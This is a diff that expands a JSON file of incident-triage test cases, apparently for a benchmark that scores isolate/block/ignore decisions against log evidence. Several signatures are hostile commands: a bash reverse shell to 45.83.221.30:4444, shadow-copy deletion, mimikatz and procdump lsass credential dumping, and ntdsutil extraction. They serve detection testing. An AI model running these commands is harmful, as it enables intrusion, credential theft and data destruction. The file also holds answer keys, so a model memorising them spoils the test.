@@ -3,42 +3,299 @@
     "id": "CASE-001-WEB-DMZ",
     "target_identifier": "WEB-BO-01",
     "expected_decision": "ISOLATE_HOST",
-    "description": "Public web server that was scanned, compromised via SSH, and used to port scan the internal network."
+    "description": "Public web server: SSH password guessing from 185.220.101.4 ended in a successful login as 'deploy', then internal reconnaissance with nmap and a scripted download cradle.",
+    "expected_evidence": [
+      {"table": "endpoint_events", "where": "hostname = 'WEB-BO-01' AND event_data LIKE '%Accepted password for deploy%'", "signature": "Accepted password for deploy from 185.220.101.4"},
+      {"table": "endpoint_events", "where": "hostname = 'WEB-BO-01' AND event_data LIKE '%nmap -sS%'", "signature": "nmap -sS -Pn 10.20.0.0/24"},
+      {"table": "alerts", "where": "src_ip = '185.220.101.4'", "signature": "ET SCAN Potential SSH Scan"}
+    ]
   },
   {
     "id": "CASE-002-FILE-SERVER",
     "target_identifier": "FILE-BO-01",
     "expected_decision": "ISOLATE_HOST",
-    "description": "File server accessed via RDP using compromised admin credentials, followed by file enumeration and archiving."
+    "description": "File server: repeated failed RDP logons from 91.240.118.172 followed by a successful logon as svc_backup, shadow-copy deletion and archive creation over the Finance share.",
+    "expected_evidence": [
+      {"table": "alerts", "where": "src_ip = '91.240.118.172' AND sensor = 'IDS-BO-EDGE'", "signature": "ET SCAN RDP Bruteforce Attempt"},
+      {"table": "endpoint_events", "where": "hostname = 'FILE-BO-01' AND event_data LIKE '%vssadmin delete shadows%'", "signature": "vssadmin delete shadows /all /quiet"},
+      {"table": "endpoint_events", "where": "hostname = 'FILE-BO-01' AND event_data LIKE '%\"event_id\": 4624%'", "signature": "svc_backup"}
+    ]
   },
   {
     "id": "CASE-003-ADMIN-WS",
     "target_identifier": "WS-NKAPOOR-01",
     "expected_decision": "ISOLATE_HOST",
-    "description": "Admin workstation beaconing outbound to attacker infrastructure."
+    "description": "Admin workstation: WMI spawning a hidden encoded PowerShell, then twelve beacon-shaped sessions to 45.83.221.30 on a fixed 60 second interval.",
+    "expected_evidence": [
+      {"table": "endpoint_events", "where": "hostname = 'WS-NKAPOOR-01' AND event_data LIKE '%wmiprvse.exe%'", "signature": "powershell.exe -nop -w hidden -enc"},
+      {"table": "network_traffic", "where": "dest_ip = '45.83.221.30' AND src_ip = '10.20.3.44'", "signature": "C3bk-1"}
+    ]
   },
   {
     "id": "CASE-004-RED-HERRING",
     "target_identifier": "WS-VHALE-01",
     "expected_decision": "IGNORE",
-    "description": "Red herring: User mistyped password during VPN reconnect."
+    "description": "False alarm to test restraint: two failed credential validations during a VPN reconnect, then a normal interactive logon and Outlook start.",
+    "expected_evidence": [
+      {"table": "endpoint_events", "where": "hostname = 'WS-VHALE-01' AND event_data LIKE '%4776%'", "signature": "vhales"}
+    ]
   },
   {
     "id": "CASE-005-EXT-SCANNER",
     "target_identifier": "45.83.220.5",
     "expected_decision": "BLOCK_IP",
-    "description": "External IP running a Nikto vulnerability scan against the public claims portal."
+    "description": "External IP running a Nikto web application scan against the public claims portal, with matching perimeter denies.",
+    "expected_evidence": [
+      {"table": "alerts", "where": "src_ip = '45.83.220.5'", "signature": "ET SCAN Nikto Web App Scan"},
+      {"table": "firewall_events", "where": "message LIKE '%45.83.220.5%'", "signature": "Deny tcp src outside:45.83.220.5"}
+    ]
   },
   {
     "id": "CASE-006-EXT-C2",
     "target_identifier": "45.83.221.30",
     "expected_decision": "BLOCK_IP",
-    "description": "External attacker infrastructure receiving beacons."
+    "description": "External infrastructure receiving regular, fixed-size outbound sessions from two internal hosts: C2, but no single host is confirmed compromised from this target alone.",
+    "expected_evidence": [
+      {"table": "network_traffic", "where": "dest_ip = '45.83.221.30' AND src_ip = '10.20.3.44'", "signature": "C6c2-1"}
+    ]
   },
   {
     "id": "CASE-007-EXT-VPN",
     "target_identifier": "198.51.100.77",
     "expected_decision": "IGNORE",
-    "description": "Source IP of the branch manager's benign failed VPN reconnect."
+    "description": "Source of a benign failed VPN reconnect by the branch manager; alert text is policy-grade, not hostile.",
+    "expected_evidence": [
+      {"table": "firewall_events", "where": "message LIKE '%198.51.100.77%'", "signature": "Failed VPN user authentication"},
+      {"table": "alerts", "where": "src_ip = '198.51.100.77'", "signature": "ET POLICY VPN Authentication Failure"}
+    ]
+  },
+  {
+    "id": "CASE-008-DOMAIN-CONTROLLER",
+    "target_identifier": "DC-BO-01",
+    "expected_decision": "ISOLATE_HOST",
+    "description": "Domain controller: lsass access with sekurlsa-style credential dumping, debug privileges on a fresh NTLM logon, then ntdsutil IFM extraction.",
+    "expected_evidence": [
+      {"table": "endpoint_events", "where": "hostname = 'DC-BO-01' AND event_data LIKE '%sekurlsa%'", "signature": "sekurlsa::logonpasswords"},
+      {"table": "endpoint_events", "where": "hostname = 'DC-BO-01' AND event_data LIKE '%ntdsutil%'", "signature": "ifm create full"}
+    ]
+  },
+  {
+    "id": "CASE-009-SQL-SERVER",
+    "target_identifier": "SQL-BO-01",
+    "expected_decision": "ISOLATE_HOST",
+    "description": "SQL server: xp_cmdshell execution spawning cmd.exe, a new local account created, and a failed 'sa' logon.",
+    "expected_evidence": [
+      {"table": "alerts", "where": "dest_ip = '10.20.2.30'", "signature": "xp_cmdshell"},
+      {"table": "endpoint_events", "where": "hostname = 'SQL-BO-01' AND event_data LIKE '%net user svc_sql%'", "signature": "net user svc_sql"}
+    ]
+  },
+  {
+    "id": "CASE-010-HR-WS",
+    "target_identifier": "WS-LCHEN-01",
+    "expected_decision": "ISOLATE_HOST",
+    "description": "HR workstation: Word spawns an encoded PowerShell, which fetches a payload from cdn-update-center.net (193.32.162.44).",
+    "expected_evidence": [
+      {"table": "endpoint_events", "where": "hostname = 'WS-LCHEN-01' AND event_data LIKE '%WINWORD.EXE%'", "signature": "powershell.exe -nop -w hidden -enc"},
+      {"table": "network_traffic", "where": "dest_ip = '193.32.162.44' AND uid = 'C10h1'", "signature": "cdn-update-center.net"}
+    ]
+  },
+  {
+    "id": "CASE-011-MAIL-GW",
+    "target_identifier": "MAIL-BO-01",
+    "expected_decision": "ISOLATE_HOST",
+    "description": "Mail gateway relaying bulk mail to 45.155.205.233: thirty accepted relay lines and twenty-five large outbound SMTP sessions in four minutes.",
+    "expected_evidence": [
+      {"table": "endpoint_events", "where": "hostname = 'MAIL-BO-01' AND event_data LIKE '%relay accepted%'", "signature": "relay accepted"},
+      {"table": "network_traffic", "where": "src_ip = '10.20.9.25' AND dest_port = 25", "signature": "45.155.205.233"}
+    ]
+  },
+  {
+    "id": "CASE-012-BACKUP-SRV",
+    "target_identifier": "BKUP-BO-01",
+    "expected_decision": "ISOLATE_HOST",
+    "description": "Backup server: a new account added to Administrators and a scheduled task pointing at an unsigned binary in Windows\\Temp.",
+    "expected_evidence": [
+      {"table": "endpoint_events", "where": "hostname = 'BKUP-BO-01' AND event_data LIKE '%svc_upd%'", "signature": "svc_upd"},
+      {"table": "endpoint_events", "where": "hostname = 'BKUP-BO-01' AND event_data LIKE '%SyncSync%' OR hostname = 'BKUP-BO-01' AND event_data LIKE '%SysSync%'", "signature": "SysSync"}
+    ]
+  },
+  {
+    "id": "CASE-013-FIN-WS",
+    "target_identifier": "WS-JDIAZ-01",
+    "expected_decision": "ISOLATE_HOST",
+    "description": "Finance workstation: procdump against lsass writing a credential dump, followed by a 1.2 MB upload to attacker infrastructure.",
+    "expected_evidence": [
+      {"table": "endpoint_events", "where": "hostname = 'WS-JDIAZ-01' AND event_data LIKE '%procdump64.exe%'", "signature": "procdump64.exe -accepteula -ma lsass.exe"},
+      {"table": "network_traffic", "where": "src_ip = '10.20.3.70'", "signature": "C13x1"}
+    ]
+  },
+  {
+    "id": "CASE-014-LINUX-APP",
+    "target_identifier": "APP-BO-02",
+    "expected_decision": "ISOLATE_HOST",
+    "description": "Linux application server: webshell upload, successful SSH login as ubuntu, reverse shell to 45.83.221.30:4444.",
+    "expected_evidence": [
+      {"table": "endpoint_events", "where": "hostname = 'APP-BO-02' AND event_data LIKE '%/dev/tcp/%'", "signature": "/bin/bash -i >& /dev/tcp/45.83.221.30/4444"},
+      {"table": "endpoint_events", "where": "hostname = 'APP-BO-02' AND event_data LIKE '%upload.php%'", "signature": "POST /upload.php"}
+    ]
+  },
+  {
+    "id": "CASE-015-EXT-SSH-BRUTE",
+    "target_identifier": "185.220.101.4",
+    "expected_decision": "BLOCK_IP",
+    "description": "External IP driving a 35-attempt SSH password guessing run against WEB-BO-02 with perimeter denies.",
+    "expected_evidence": [
+      {"table": "alerts", "where": "src_ip = '185.220.101.4'", "signature": "SSH Brute Force Password Guessing"},
+      {"table": "endpoint_events", "where": "hostname = 'WEB-BO-02' AND event_data LIKE '%Failed password for root from 185.220.101.4%'", "signature": "Failed password for root from 185.220.101.4"}
+    ]
+  },
+  {
+    "id": "CASE-016-EXT-SQLI",
+    "target_identifier": "103.152.90.14",
+    "expected_decision": "BLOCK_IP",
+    "description": "External IP running sqlmap UNION SELECT injection against the claims API on WEB-BO-02.",
+    "expected_evidence": [
+      {"table": "alerts", "where": "src_ip = '103.152.90.14'", "signature": "SQL Injection Attempt UNION SELECT"},
+      {"table": "endpoint_events", "where": "hostname = 'WEB-BO-02' AND event_data LIKE '%sqlmap%'", "signature": "sqlmap/1.8.2"}
+    ]
+  },
+  {
+    "id": "CASE-017-EXT-WEBSHELL",
+    "target_identifier": "194.26.29.88",
+    "expected_decision": "BLOCK_IP",
+    "description": "External IP uploading shell.php into the WordPress uploads directory on WEB-BO-02.",
+    "expected_evidence": [
+      {"table": "alerts", "where": "src_ip = '194.26.29.88'", "signature": "PHP Webshell Upload Attempt"},
+      {"table": "endpoint_events", "where": "hostname = 'WEB-BO-02' AND event_data LIKE '%shell.php%'", "signature": "POST /wp-content/uploads/2026/05/shell.php"}
+    ]
+  },
+  {
+    "id": "CASE-018-EXT-CRED-STUFFING",
+    "target_identifier": "91.240.118.172",
+    "expected_decision": "BLOCK_IP",
+    "description": "External IP behind nine failed RDP logons as 'administrator' plus RDP brute-force alerts.",
+    "expected_evidence": [
+      {"table": "alerts", "where": "src_ip = '91.240.118.172'", "signature": "RDP Bruteforce Attempt"},
+      {"table": "endpoint_events", "where": "hostname = 'FILE-BO-01' AND event_data LIKE '%91.240.118.172%'", "signature": "administrator"}
+    ]
+  },
+  {
+    "id": "CASE-019-EXT-MALWARE-CDN",
+    "target_identifier": "193.32.162.44",
+    "expected_decision": "BLOCK_IP",
+    "description": "External host serving the malware payload: Emotet loader alert and the /update.bin fetch logged by Zeek.",
+    "expected_evidence": [
+      {"table": "alerts", "where": "dest_ip = '193.32.162.44'", "signature": "Emotet"},
+      {"table": "network_traffic", "where": "dest_ip = '193.32.162.44' AND uid = 'C19m1'", "signature": "cdn-update-center.net"}
+    ]
+  },
+  {
+    "id": "CASE-020-EXT-PORTSCAN",
+    "target_identifier": "80.94.95.226",
+    "expected_decision": "BLOCK_IP",
+    "description": "External IP sweeping ports on the domain controller: VNC scan signatures and fifteen perimeter denies.",
+    "expected_evidence": [
+      {"table": "alerts", "where": "src_ip = '80.94.95.226'", "signature": "ET SCAN Potential VNC Scan"},
+      {"table": "firewall_events", "where": "message LIKE '%80.94.95.226%'", "signature": "Deny tcp src outside:80.94.95.226"}
+    ]
+  },
+  {
+    "id": "CASE-021-EXT-RDP-BRUTE",
+    "target_identifier": "222.186.42.7",
+    "expected_decision": "BLOCK_IP",
+    "description": "External IP guessing RDP credentials for 'amorgan' from the internet.",
+    "expected_evidence": [
+      {"table": "alerts", "where": "src_ip = '222.186.42.7'", "signature": "RDP Bruteforce Attempt"},
+      {"table": "endpoint_events", "where": "hostname = 'WS-AMORGAN-01' AND event_data LIKE '%222.186.42.7%'", "signature": "222.186.42.7"}
+    ]
+  },
+  {
+    "id": "CASE-022-BENIGN-MICROSOFT-IP",
+    "target_identifier": "40.97.128.10",
+    "expected_decision": "IGNORE",
+    "description": "False positive to test restraint: a Microsoft-owned address carrying a normal M365 sign-in, alert classified Not Suspicious Traffic.",
+    "expected_evidence": [
+      {"table": "alerts", "where": "src_ip = '40.97.128.10'", "signature": "Not Suspicious Traffic"}
+    ]
+  },
+  {
+    "id": "CASE-023-BENIGN-BACKUP-INTERNAL",
+    "target_identifier": "10.20.4.15",
+    "expected_decision": "IGNORE",
+    "description": "Internal backup server pushing 40 MB to the file server over SMB once an hour, as designed.",
+    "expected_evidence": [
+      {"table": "network_traffic", "where": "src_ip = '10.20.4.15' AND dest_port = 445", "signature": "C23b1"}
+    ]
+  },
+  {
+    "id": "CASE-024-BENIGN-UPDATES",
+    "target_identifier": "WS-DPATEL-01",
+    "expected_decision": "IGNORE",
+    "description": "Windows Update at 08:40: wuauserv spawns wuauclt and pulls from Microsoft CDN endpoints.",
+    "expected_evidence": [
+      {"table": "endpoint_events", "where": "hostname = 'WS-DPATEL-01' AND event_data LIKE '%wuauclt%'", "signature": "wuauclt.exe /UpdateDeploymentProvider"}
+    ]
+  },
+  {
+    "id": "CASE-025-BENIGN-INTERNAL-SCANNER",
+    "target_identifier": "SCAN-BO-01",
+    "expected_decision": "IGNORE",
+    "description": "The vulnerability scanner itself: nessusd service, scheduled 'Weekly Baseline' policy, and Nessus user-agent alerts pointing at internal hosts.",
+    "expected_evidence": [
+      {"table": "endpoint_events", "where": "hostname = 'SCAN-BO-01' AND event_data LIKE '%nessusd%'", "signature": "nessusd.exe --service"},
+      {"table": "alerts", "where": "src_ip = '10.20.0.40'", "signature": "Nessus User-Agent"}
+    ]
+  },
+  {
+    "id": "CASE-026-BENIGN-ADMIN-SSH",
+    "target_identifier": "WEB-BO-02",
+    "expected_decision": "IGNORE",
+    "description": "Operations engineer logging in over SSH from the admin jump host and restarting nginx.",
+    "expected_evidence": [
+      {"table": "endpoint_events", "where": "hostname = 'WEB-BO-02' AND event_data LIKE '%systemctl status nginx%'", "signature": "systemctl status nginx"}
+    ]
+  },
+  {
+    "id": "CASE-027-BENIGN-DNS",
+    "target_identifier": "DNS-BO-01",
+    "expected_decision": "IGNORE",
+    "description": "Recursive resolver forwarding ordinary Office 365 lookups upstream to 8.8.8.8.",
+    "expected_evidence": [
+      {"table": "endpoint_events", "where": "hostname = 'DNS-BO-01' AND event_data LIKE '%outlook.office365.com%'", "signature": "outlook.office365.com"}
+    ]
+  },
+  {
+    "id": "CASE-028-BENIGN-NO-EVIDENCE",
+    "target_identifier": "203.0.113.77",
+    "expected_decision": "IGNORE",
+    "description": "An alert with no corroborating telemetry anywhere: the correct answer is to say so, not to invent a verdict.",
+    "expected_evidence": []
+  },
+  {
+    "id": "CASE-029-BENIGN-RDP-ADMIN",
+    "target_identifier": "WS-AMORGAN-01",
+    "expected_decision": "IGNORE",
+    "description": "RDP into a workstation from the internal admin jump host during business hours, followed by ipconfig and Excel.",
+    "expected_evidence": [
+      {"table": "endpoint_events", "where": "hostname = 'WS-AMORGAN-01' AND event_data LIKE '%ipconfig%'", "signature": "ipconfig /all"}
+    ]
+  },
+  {
+    "id": "CASE-030-BENIGN-FILE-SHARE",
+    "target_identifier": "WS-MTAYLOR-01",
+    "expected_decision": "IGNORE",
+    "description": "Workstation opening one spreadsheet on the Finance share mid-afternoon.",
+    "expected_evidence": [
+      {"table": "endpoint_events", "where": "hostname = 'WS-MTAYLOR-01' AND event_data LIKE '%Q1-budget.xlsx%'", "signature": "Q1-budget.xlsx"}
+    ]
+  },
+  {
+    "id": "CASE-031-BENIGN-PASSWORD-TYPO",
+    "target_identifier": "WS-KORAM-01",
+    "expected_decision": "IGNORE",
+    "description": "Three fat-fingered console logon attempts, then a successful logon and Teams starting.",
+    "expected_evidence": [
+      {"table": "endpoint_events", "where": "hostname = 'WS-KORAM-01' AND event_data LIKE '%TEAMS.EXE%'", "signature": "TEAMS.EXE"}
+    ]
   }
 ]
